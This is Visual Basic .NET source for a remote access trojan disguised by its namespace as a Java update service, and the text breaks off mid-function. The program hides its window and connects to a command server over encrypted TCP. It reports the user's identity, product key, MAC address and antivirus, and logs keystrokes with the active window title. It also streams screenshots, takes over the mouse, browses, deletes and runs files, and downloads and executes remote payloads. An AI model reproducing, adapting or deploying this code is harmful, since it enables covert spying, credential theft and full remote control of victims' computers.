Imports System.Windows
Imports System
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports Microsoft.VisualBasic
Imports System.Reflection
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Management
Imports System.Text.RegularExpressions
Imports System.Text
Imports Microsoft.Win32
Imports System.Net.NetworkInformation
Imports System.Drawing

Namespace Java_JRE_Update_Service
    Public Class EntryPoint
        Public Shared Sub Main(ByVal args As [String]())
            Dim FrmMain As New Form1
            FrmMain.Size = New System.Drawing.Size(0, 0)
            FrmMain.ShowInTaskbar = False
            FrmMain.Visible = False
            FrmMain.Opacity = 0
            System.Windows.Forms.Application.Run(FrmMain)
        End Sub
    End Class
    Public Class Form1
        Inherits System.Windows.Forms.Form
        Dim client As TcpClient
        Dim Connection As Thread
        Dim enckey As String = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw"
        Dim dlay As Integer = 10001
        Dim clientPort As Integer = 10002
        Dim screensending As Thread
        Dim comp As Long
        Dim res As String

        Private Declare Function SetCursorPos Lib "user32" (ByVal X As Integer, ByVal Y As Integer) As Integer
        Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
        Private Const MOUSEEVENTF_LEFTDOWN As Object = &H2
        Private Const MOUSEEVENTF_LEFTUP As Object = &H4
        Private Const MOUSEEVENTF_RIGHTDOWN As Object = &H8
        Private Const MOUSEEVENTF_RIGHTUP As Object = &H10

        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32

        Dim WithEvents logger As New YATHURU
        Dim kyLogs As String
        Dim tempWinTitle As String
        Dim currentDir As String
        Dim listviewfiles As New ListView
        Dim discomousing As Thread

        Dim objMutex As Mutex

        Sub New()
            logger.CreateHook()
        End Sub

#Region "Connection"
        Sub Connect()
TryAgain:
            Try
                If dlay > 0 Then
                    Threading.Thread.Sleep(dlay)
                End If

                client = New TcpClient("SERVER-IP", clientPort)
                Send(AES_Encrypt("NewConnection|VB.Net|" & SystemInformation.UserName.ToString() & "|" & SystemInformation.ComputerName.ToString() & "|" & My.Computer.Info.OSFullName & "|" & My.Computer.Info.OSVersion & "|" & getpriv(), enckey))
                client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
            Catch ex As Exception
                GoTo TryAgain
            End Try
        End Sub
        Sub Read(ByVal ar As IAsyncResult)
            Dim message As String
            Try
                Dim reader As New StreamReader(client.GetStream())
                message = reader.ReadLine()
                message = AES_Decrypt(message, enckey)
                parse(message)
                client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
            Catch ex As Exception
                Threading.Thread.Sleep(4000)
                Connect()
            End Try
        End Sub
        Public Sub Send(ByVal message As String)
            Try
                Dim writer As New StreamWriter(client.GetStream())
                writer.WriteLine(message)
                writer.Flush()
            Catch
            End Try
        End Sub
        Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
            Try
                objMutex = New Mutex(False, "SINGLE_INSTANCE_APP_MUTEX")
                If objMutex.WaitOne(0, False) = False Then
                    objMutex.Close()
                    objMutex = Nothing
                    Application.ExitThread()
                    End
                End If

                Connection = New Thread(AddressOf Connect)
                Connection.Start()
            Catch
            End Try
        End Sub

        Sub parse(ByVal msg As String)
            Try
                If msg = "Disconnected" Then
                    Connection.Abort()
                    Connection = New Thread(AddressOf Connect)
                    Connection.Start()
                ElseIf msg = "SystemInformation" Then
                    Send(AES_Encrypt("SystemInformation|" & GetDeepInfo(), enckey))
                ElseIf msg = "GetProcess" Then
                    sendprocess()
                ElseIf msg.StartsWith("Kill") Then
                    KillProcesses(msg)
                ElseIf msg.StartsWith("New") Then
                    System.Diagnostics.Process.Start(msg.Split("|")(1))
                ElseIf msg = "Software" Then
                    getinstalledsoftware()
                ElseIf msg.StartsWith("RD") Then
                    comp = msg.Split("|")(1)
                    res = msg.Split("|")(2)
                    screensending = New Thread(AddressOf sendscreen)
                    screensending.Start()
                ElseIf msg = "Stop" Then
                    screensending.Abort()
                ElseIf msg = "GetPcBounds" Then
                    Send(AES_Encrypt("PCBounds" & My.Computer.Screen.Bounds.Height & "x" & My.Computer.Screen.Bounds.Width, enckey))
                ElseIf msg.Contains("SetCurPos") Then
                    MouseMov(msg)
                ElseIf msg.StartsWith("OpenWebsite") Then
                    openwebsite(msg.Replace("OpenWebsite", ""))
                ElseIf msg.StartsWith("DandE") Then
                    dande(msg.Replace("DandE", ""))

                ElseIf msg = "yaturu_ganna" Then
                    Send(AES_Encrypt("YATURU" & kyLogs, enckey))
                ElseIf msg = "yaturu_makanna" Then
                    kyLogs = ""
                ElseIf msg = "GetTCPConnections" Then
                    Send(AES_Encrypt("TCPConnections" & GetTCPConnections(), enckey))
                ElseIf msg.StartsWith("GetStartup") Then
                    GetStartupEntries()
                ElseIf msg.StartsWith("ExecuteFromLink") Then
                    ExecutefromLink(msg.Replace("ExecuteFromLink", ""))
                ElseIf msg.StartsWith("ExecutefromFile") Then
                    ExecutefromFile(msg.Replace("ExecutefromFile", ""))
                ElseIf msg = "Restart" Then
                    rstart()
                ElseIf msg = "Close" Then
                    Application.Exit()
                ElseIf msg = "ListDrives" Then
                    listdrives()
                ElseIf msg.StartsWith("ListFiles") Then
                    showfiles(msg.Replace("ListFiles", ""))
                ElseIf msg.Contains("mkdir") Then
                    createnewdirectory(msg.Replace("mkdir", ""))
                ElseIf msg.Contains("rmdir") Then
                    deletedirectory(msg.Replace("rmdir", ""))
                ElseIf msg.Contains("rnfolder") Then
                    renamedirectory(msg.Replace("rnfolder", "").Split("|")(0), msg.Replace("rnfolder", "").Split("|")(1))
                ElseIf msg.Contains("mvdir") Then
                    movedirectory(msg.Replace("mvdir", "").Split("|")(0), msg.Replace("mvdir", "").Split("|")(1), msg.Replace("mvdir", "").Split("|")(2))
                ElseIf msg.Contains("cpdir") Then
                    copydirectory(msg.Replace("cpdir", "").Split("|")(0), msg.Replace("cpdir", "").Split("|")(1), msg.Replace("cpdir", "").Split("|")(2))
                ElseIf msg.Contains("mkfile") Then
                    CreateNewFile(msg)
                ElseIf msg.Contains("rmfile") Then
                    deletefile(msg.Replace("rmfile", "").Split("|")(0))
                ElseIf msg.Contains("exfile") Then
                    executefile(msg.Replace("exfile", "").Split("|")(0))
                ElseIf msg.Contains("exdir") Then
                    executedir(msg.Replace("exdir", "").Split("|")(0))
                ElseIf msg.Contains("rnfile") Then
                    renamefile(msg.Replace("rnfile", "").Split("|")(0), msg.Replace("rnfile", "").Split("|")(1))
                ElseIf msg.Contains("movefile") Then
                    movefile(msg.Replace("movefile", "").Split("|")(0), msg.Replace("movefile", "").Split("|")(1), msg.Replace("move", "").Split("|")(2))
                ElseIf msg.Contains("copyfile") Then
                    copyfile(msg.Replace("copyfile", "").Split("|")(0), msg.Replace("copyfile", "").Split("|")(1), msg.Replace("copyfile", "").Split("|")(2))
                ElseIf msg.StartsWith("sharefile") Then
                    sharefile(msg.Replace("sharefile", ""))
                ElseIf msg.StartsWith("FileUpload") Then
                    UploadFile(msg.Replace("FileUpload", ""))

                ElseIf msg.StartsWith("GetThumbNails") Then
                    SendThumbNail()
                ElseIf msg.Contains("Website") Then
                    openwebsite(msg.Split("|")(1))
                ElseIf msg.Contains("logoff") Then
                    Shell("shutdown /l")
                ElseIf msg.Contains("shutdwn") Then
                    Shell("shutdown /s")
                ElseIf msg.Contains("restrt") Then
                    Shell("shutdown /r")
                    discomousing.Start()
                ElseIf msg = "StopDiscoMouse" Then
                    discomousing.Abort()

                End If
            Catch
            End Try
        End Sub

#End Region

#Region "Others"

        Sub KillProcesses(ByVal txt As String)
            Try
                txt = txt.Replace("Kill|", "")

                For i As Integer = 0 To CountCharacter(txt, "|")
                    System.Diagnostics.Process.GetProcessesByName(txt.Split("|")(i).Remove(txt.Split("|")(i).Length - 4, 4))(0).CloseMainWindow()
                Next
            Catch
            End Try
        End Sub
        Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
            Try
                Dim cnt As Integer = 0
                For Each c As Char In value
                    If c = ch Then cnt += 1
                Next
                Return cnt
            Catch
                Return Nothing
            End Try
        End Function
        Sub openwebsite(ByVal url As String)
            Try
                System.Diagnostics.Process.Start(url)
            Catch : End Try
        End Sub
        Sub dande(ByVal url As String)
            Try
                Dim web As New WebClient
                web.DownloadFile(url, My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\file.exe")
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\file.exe")
            Catch
            End Try
        End Sub
        Private Function GetBetween(ByVal input As String, ByVal str1 As String, ByVal str2 As String, ByVal index As Integer) As String
            Dim temp As String = Regex.Split(input, str1)(index + 1)
            Return Regex.Split(temp, str2)(0)
        End Function

        Sub ExecutefromLink(ByVal url As String)
            Try
                My.Computer.Network.DownloadFile(url, My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
            Catch
            End Try
        End Sub
        Sub ExecutefromFile(ByVal txt As String)
            Try
                File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe", Convert.FromBase64String(txt))
                Shell(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\exec.exe")
            Catch
            End Try
        End Sub
        Sub rstart()
            Try
                Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
                p.Arguments = "/C ping 1.1.1.1 -n 1 -w 15 > Nul & " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
                p.CreateNoWindow = True
                p.ErrorDialog = False
                p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                System.Diagnostics.Process.Start(p)
                Application.Exit()
            Catch
            End Try
        End Sub

        Sub UploadFile(ByVal txt As String)
            Try
                'MsgBox(txt.Split("|")(0))
                'IO.File.WriteAllBytes(txt.Split("|")(0), Convert.FromBase64String(txt.Replace(txt.Split("|")(0) & "|", "")))
            Catch
            End Try
        End Sub

#End Region

#Region "Get Connect"

        Public Function getpriv() As String
            Try
                My.User.InitializeWithWindowsUser()

                If My.User.IsAuthenticated() Then
                    If My.User.IsInRole(ApplicationServices.BuiltInRole.Administrator) Then
                        Return "Admin"
                    ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.User) Then
                        Return "User"
                    ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.Guest) Then
                        Return "Guest"
                    Else
                        Return "Unknown"
                    End If
                End If
                Return "Unknown"
            Catch
                Return "Unknown"
            End Try
        End Function
        <DllImport("kernel32.dll")> _
        Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
        End Function

        Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
        Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002

        Private Shared Function GetInfo() As String
            Dim lpLCData As Object = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Dim s As String = lpLCData.ToString().Substring(0, ret - 1)
                Return UCase(s.Substring(0, 3))
            End If
            Return String.Empty
        End Function
#End Region

#Region "Deep Information"
        Function GetDeepInfo() As String
            Try
                Return Environment.UserName & "|" & _
                Environment.UserDomainName & "|" & _
                My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Win8", "ProductKey", "N/A") & "|" & _
                NetworkInterface.GetAllNetworkInterfaces()(0).GetPhysicalAddress().ToString & "|" & _
                "Not Verified" & "|" & _
                GetAV() & "|" & _
                Application.ExecutablePath
            Catch
                Return ""
            End Try
        End Function
        Function GetAV() As String
            Dim wmiQuery As Object = "Select * From AntiVirusProduct"
            Dim objWMIService As Object = GetObject("winmgmts:\\.\root\SecurityCenter2")
            Dim colItems As Object = objWMIService.ExecQuery(wmiQuery)
            For Each objItem As Object In colItems
                On Error Resume Next
                Return objItem.displayName.ToString()
            Next
            Return Nothing
        End Function
#End Region

#Region "info"

        Sub sendprocess()
            Dim p As New System.Diagnostics.Process()
            Dim count As Integer = 0
            Dim Listview1 As New ListView
            For Each p In System.Diagnostics.Process.GetProcesses(My.Computer.Name)
                On Error Resume Next
                Listview1.Items.Add(p.ProcessName & ".exe")
                Listview1.Items(count).SubItems.Add(FormatNumber(Math.Round(p.PrivateMemorySize64 / 1024), 0) & " K")
                Listview1.Items(count).SubItems.Add(p.Responding)
                Listview1.Items(count).SubItems.Add(p.StartTime.ToString().Trim)
                Listview1.Items(count).SubItems.Add(p.Id)
                count += 1
            Next

            Dim Items As String = ""
            For Each item As ListViewItem In Listview1.Items
                Items = Items & item.Text & "|" & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "|" & item.SubItems(4).Text & vbNewLine
            Next
            Items = Items.Trim

            Send(AES_Encrypt("GetProcess" & Items, enckey))
        End Sub
        Sub getinstalledsoftware()
            Try

                Dim regkey, subkey As Microsoft.Win32.RegistryKey
                Dim value As String
                Dim regpath As String = "Software\Microsoft\Windows\CurrentVersion\Uninstall"
                Dim software As String = String.Empty
                Dim softwarecount As Integer

                regkey = My.Computer.Registry.LocalMachine.OpenSubKey(regpath)
                Dim subkeys() As String = regkey.GetSubKeyNames
                Dim includes As Boolean
                For Each subk As String In subkeys
                    subkey = regkey.OpenSubKey(subk)
                    value = subkey.GetValue("DisplayName", "")
                    If value <> "" Then
                        includes = True
                        If value.IndexOf("Hotfix") <> -1 Then includes = False
                        If value.IndexOf("Security Update") <> -1 Then includes = False
                        If value.IndexOf("Update for") <> -1 Then includes = False
                        If includes = True Then
                            software += value & "|" & vbCrLf
                            softwarecount += 1
                        End If
                    End If
                Next

                Dim final As String = "Software|" & softwarecount & "|" & software
                Send(AES_Encrypt(final, enckey))
            Catch
            End Try
        End Sub
        Function GetTCPConnections() As String
            Try
                Dim s As String = String.Empty

                Dim properties As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties()
                Dim connections() As TcpConnectionInformation = properties.GetActiveTcpConnections()

                For Each c As TcpConnectionInformation In connections
                    s += String.Format("{0}|{1}|{2}", c.LocalEndPoint, c.RemoteEndPoint, c.State) & vbCrLf
                Next

                Return s.Trim
            Catch
                Return Nothing
            End Try
        End Function
        Private Sub GetStartupEntries()
            Try
                Dim x As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)

                Dim dir As DirectoryInfo = New DirectoryInfo(x)
                Dim files() As FileInfo = dir.GetFiles

                Dim regkeys(3) As RegistryKey

                regkeys(0) = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
                regkeys(1) = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                regkeys(2) = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
                regkeys(3) = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce")

                Dim result As String = String.Empty

                For Each File As FileInfo In files
                    result += String.Format("{0}|{1}|{2}", x, File.Name, x & "\" & File.Name) & vbCrLf
                Next

                For i As Integer = 0 To 3
                    For Each valueName As String In regkeys(i).GetValueNames()
                        result += String.Format("{0}|{1}|{2}", regkeys(i).ToString, valueName, regkeys(i).GetValue(valueName)) & vbCrLf
                    Next
                Next

                result = result.Trim
                Send(AES_Encrypt("Strtp" & result, enckey))
            Catch
            End Try
        End Sub
#End Region

#Region "Encryption"
    Private Const ALGORITHM As String = "AES"
        Private Const TRANSFORMATION As String = "AES/ECB/PKCS5Padding"

        Public Function AES_Encrypt(ByVal input As String, ByVal key As String) As String
            Dim secretKey As Byte() = GetKey(key)
            Using aes As New System.Security.Cryptography.RijndaelManaged()
                aes.Key = secretKey
                aes.Mode = System.Security.Cryptography.CipherMode.ECB
                aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7
                Using encryptor = aes.CreateEncryptor()
                    Dim inputBytes As Byte() = Encoding.UTF8.GetBytes(input)
                    Dim encryptedBytes As Byte() = encryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length)
                    Return Convert.ToBase64String(encryptedBytes)
                End Using
            End Using
        End Function

        Public Function AES_Decrypt(ByVal input As String, ByVal key As String) As String
            Dim secretKey As Byte() = GetKey(key)
            Using aes As New System.Security.Cryptography.RijndaelManaged()
                aes.Key = secretKey
                aes.Mode = System.Security.Cryptography.CipherMode.ECB
                aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7
                Using decryptor = aes.CreateDecryptor()
                    Dim inputBytes As Byte() = Convert.FromBase64String(input)
                    Dim decryptedBytes As Byte() = decryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length)
                    Return Encoding.UTF8.GetString(decryptedBytes)
                End Using
            End Using
        End Function

        Private Function GetKey(ByVal key As String) As Byte()
            Using sha As System.Security.Cryptography.SHA256 = System.Security.Cryptography.SHA256.Create()
                Dim keyBytes As Byte() = Encoding.UTF8.GetBytes(key)
                Return sha.ComputeHash(keyBytes)
            End Using
        End Function
#End Region

#Region "Surveillance"
#Region "Remote Desktop"
        Sub sendscreen()
            Try

                Dim width As Integer = res.Split("x")(0)
                Dim height As Integer = res.Split("x")(1)

                Dim b As New System.Drawing.Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(b)
                g.CopyFromScreen(0, 0, 0, 0, b.Size)
                g.Dispose()

                Dim p, pp As New PictureBox
                p.Image = b
                Dim img As System.Drawing.Image = p.Image
                pp.Image = img.GetThumbnailImage(width, height, Nothing, Nothing)
                Dim img2 As System.Drawing.Image = pp.Image

                Dim bmp1 As New System.Drawing.Bitmap(img2)
                Dim jgpEncoder As System.Drawing.Imaging.ImageCodecInfo = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim myEncoder As System.Drawing.Imaging.Encoder = System.Drawing.Imaging.Encoder.Quality
                Dim myEncoderParameters As New System.Drawing.Imaging.EncoderParameters(1)
                Dim myEncoderParameter As New System.Drawing.Imaging.EncoderParameter(myEncoder, comp)
                myEncoderParameters.Param(0) = myEncoderParameter
                bmp1.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg", jgpEncoder, myEncoderParameters)
                Send(AES_Encrypt("RemoteDesktop" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg")), enckey))
                IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg")
            Catch
            End Try
        End Sub
        Private Function GetEncoder(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
            Try
                Dim codecs As System.Drawing.Imaging.ImageCodecInfo() = System.Drawing.Imaging.ImageCodecInfo.GetImageDecoders()
                Dim codec As System.Drawing.Imaging.ImageCodecInfo
                For Each codec In codecs
                    If codec.FormatID = format.Guid Then
                        Return codec
                    End If
                Next codec
                Return Nothing
            Catch
                Return Nothing
            End Try
        End Function
#End Region

        Sub MouseMov(ByVal txt As String)
            Try
                If txt.StartsWith("Left") Then
                    Dim x As Integer = txt.Replace("LeftSetCurPos", "").Split("x")(0)
                    Dim y As Integer = txt.Replace("LeftSetCurPos", "").Split("x")(1)

                    SetCursorPos(x, y)
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                ElseIf txt.StartsWith("Right") Then
                    Dim x As Integer = txt.Replace("RightSetCurPos", "").Split("x")(0)
                    Dim y As Integer = txt.Replace("RightSetCurPos", "").Split("x")(1)

                    SetCursorPos(x, y)
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                End If
            Catch
            End Try
        End Sub

        Sub SendThumbNail()
            Try

                Dim b As New System.Drawing.Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(b)
                g.CopyFromScreen(0, 0, 0, 0, b.Size)
                g.Dispose()

                Dim p, pp As New PictureBox
                p.Image = b
                Dim img As System.Drawing.Image = p.Image
                pp.Image = img.GetThumbnailImage(242, 152, Nothing, Nothing)
                Dim img2 As System.Drawing.Image = pp.Image

                Dim bmp1 As New System.Drawing.Bitmap(img2)
                Dim jgpEncoder As System.Drawing.Imaging.ImageCodecInfo = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim myEncoder As System.Drawing.Imaging.Encoder = System.Drawing.Imaging.Encoder.Quality
                Dim myEncoderParameters As New System.Drawing.Imaging.EncoderParameters(1)
                Dim myEncoderParameter As New System.Drawing.Imaging.EncoderParameter(myEncoder, 100L)
                myEncoderParameters.Param(0) = myEncoderParameter
                bmp1.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg", jgpEncoder, myEncoderParameters)
                Send(AES_Encrypt("ThumbNail" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg")), enckey))
                IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg")
            Catch
            End Try
        End Sub
#End Region

#Region "යතුරු"
        Private Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
            Return MyStr
        End Function
        Private Sub logger_Down(ByVal Key As String) Handles logger.Down
            Call APPU()
            kyLogs &= Key
        End Sub
        Sub APPU()
            If tempWinTitle <> GetActiveWindowTitle() Then
                kyLogs = kyLogs & vbCrLf & vbCrLf & "[" & My.Computer.Clock.LocalTime.Date & " " & My.Computer.Clock.LocalTime.Hour & ":" & My.Computer.Clock.LocalTime.Minute & ":" & My.Computer.Clock.LocalTime.Second & " | " & GetActiveWindowTitle() & "]" + vbNewLine & vbNewLine
                tempWinTitle = GetActiveWindowTitle()
            End If
        End Sub


        Public Class YATHURU
            Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
            Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
            Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
            Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
            Public Shared Event Down(ByVal Key As String)
            Public Shared Event Up(ByVal Key As String)
            Private Shared Key As Integer
            Private Shared KHD As KDel
            Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
            Public Sub CreateHook()
                KHD = New KDel(AddressOf Proc)
                Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
            End Sub

            Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
                If (Code = 0) Then
                    Select Case wParam
                        Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                        Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
                    End Select
                End If
                Return CallNextHookEx(Key, Code, wParam, lParam)
            End Function
            Public Sub DiposeHook()
                UnhookWindowsHookEx(Key)
                MyBase.Finalize()
            End Sub
            Private Function Feed(ByVal e As Keys) As String
                Select Case e
                    Case 65 To 90
                        If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                            Return e.ToString
                        Else
                            Return e.ToString.ToLower
                        End If
                    Case 48 To 57
                        If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                            Select Case e.ToString
                                Case "D1" : Return "!"
                                Case "D2" : Return "@"
                                Case "D3" : Return "#"
                                Case "D4" : Return "$"
                                Case "D5" : Return "%"
                                Case "D6" : Return "^"
                                Case "D7" : Return "&"
                                Case "D8" : Return "*"
                                Case "D9" : Return "("
                                Case "D0" : Return ")"
                            End Select
                        Else
                            Return e.ToString.Replace("D", Nothing)
                        End If
                    Case 96 To 105
                        Return e.ToString.Replace("NumPad", Nothing)
                    Case 106 To 111
                        Select Case e.ToString
                            Case "Divide" : Return "/"
                            Case "Multiply" : Return "*"
                            Case "Subtract" : Return "-"
                            Case "Add" : Return "+"
                            Case "Decimal" : Return "."
                        End Select
                    Case 32
                        Return " "
                    Case 186 To 222
                        If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                            Select Case e.ToString
                                Case "OemMinus" : Return "_"
                                Case "Oemplus" : Return "+"
                                Case "OemOpenBrackets" : Return "{"
                                Case "Oem6" : Return "}"
                                Case "Oem5" : Return "|"
                                Case "Oem1" : Return ":"
                                Case "Oem7" : Return """"
                                Case "Oemcomma" : Return "<"
                                Case "OemPeriod" : Return ">"
                                Case "OemQuestion" : Return "?"
                                Case "Oemtilde" : Return "~"
                            End Select
                        Else
                            Select Case e.ToString
                                Case "OemMinus" : Return "-"
                                Case "Oemplus" : Return "="
                                Case "OemOpenBrackets" : Return "["
                                Case "Oem6" : Return "]"
                                Case "Oem5" : Return "\"
                                Case "Oem1" : Return ";"
                                Case "Oem7" : Return "'"
                                Case "Oemcomma" : Return ","
                                Case "OemPeriod" : Return "."
                                Case "OemQuestion" : Return "/"
                                Case "Oemtilde" : Return "`"
                            End Select
                        End If
                    Case Keys.Return
                        Return Environment.NewLine
                    Case Else
                        Return "<" + e.ToString + ">"
                End Select
                Return Nothing
            End Function
        End Class

#End Region

#Region "FileManager"
        Sub listdrives()
            Try
                Dim drives As String = String.Empty
                For Each drive As IO.DriveInfo In IO.DriveInfo.GetDrives
                    Dim ltr As String = drive.Name
                    If drive.IsReady AndAlso drive.VolumeLabel <> "" Then
                    Else
                    End If
                    drives += ltr & "|"
                Next
                Send(AES_Encrypt("Drives" & drives, enckey))
            Catch
            End Try
        End Sub
        Sub showfiles(ByVal path As String)
            Try
                listviewfiles.Items.Clear()
                currentDir = ""
                For Each Dir As String In Directory.GetDirectories(path)
                    Dir = Dir.Replace(path, "")
                    Dim d As New DirectoryInfo(path & Dir & "\")
                    With listviewfiles.Items.Add(Dir, 0)
                        .SubItems.Add(d.CreationTime)
                        .SubItems.Add(d.LastAccessTime)
                        .SubItems.Add("")
                        .SubItems.Add("1")
                    End With
                Next

                Dim file As String
                file = Dir$(path)
                Do While Len(file)
                    Dim f As New FileInfo(path & file)
                    With listviewfiles.Items.Add(file)
                        .SubItems.Add(f.CreationTime)
                        .SubItems.Add(f.LastAccessTime)
                        .SubItems.Add(Format((f.Length / 1024) / 1024, "###,###,##0.00") & " MB")
                        .SubItems.Add("0")
                    End With
                    file = Dir$()
                Loop
                currentDir = path

                Dim Items As String = currentDir & "|"
                For Each item As ListViewItem In listviewfiles.Items
                    Items = Items & item.Text & "|" & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "|" & item.SubItems(4).Text & vbNewLine
                Next
                Items = Items.Trim

                Send(AES_Encrypt("FileManagerFiles" & Items, enckey))
            Catch
            End Try
        End Sub
        Sub createnewdirectory(ByVal path As String)
            Try
                My.Computer.FileSystem.CreateDirectory(path)
            Catch
            End Try
        End Sub
        Sub deletedirectory(ByVal path As String)
            Try
                My.Computer.FileSystem.DeleteDirectory(path, FileIO.DeleteDirectoryOption.DeleteAllContents)
            Catch
            End Try
        End Sub
        Sub renamedirectory(ByVal path As String, ByVal newname As String)
            Try
                My.Computer.FileSystem.RenameDirectory(path, newname)
            Catch
            End Try
        End Sub
        Sub movedirectory(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.MoveDirectory(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub copydirectory(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.CopyDirectory(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub CreateNewFile(ByVal txt As String)
            Try
                txt = txt.Replace("mkfile", "")
                Dim path As String = txt.Split("|")(0)
                Dim content As String = txt.Split("|")(1)
                IO.File.WriteAllText(path, content)
            Catch
            End Try
        End Sub
        Sub deletefile(ByVal path As String)
            Try
                My.Computer.FileSystem.DeleteFile(path, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            Catch
            End Try
        End Sub
        Sub executefile(ByVal path As String)
            Try
                If My.Computer.FileSystem.FileExists(path) Then
                    System.Diagnostics.Process.Start("explorer.exe", path)
                End If
            Catch
            End Try
        End Sub
        Sub executedir(ByVal path As String)
            Try
                If My.Computer.FileSystem.DirectoryExists(path) Then
                    System.Diagnostics.Process.Start(path)
                End If
            Catch
            End Try
        End Sub
        Sub renamefile(ByVal path As String, ByVal newname As String)
            Try
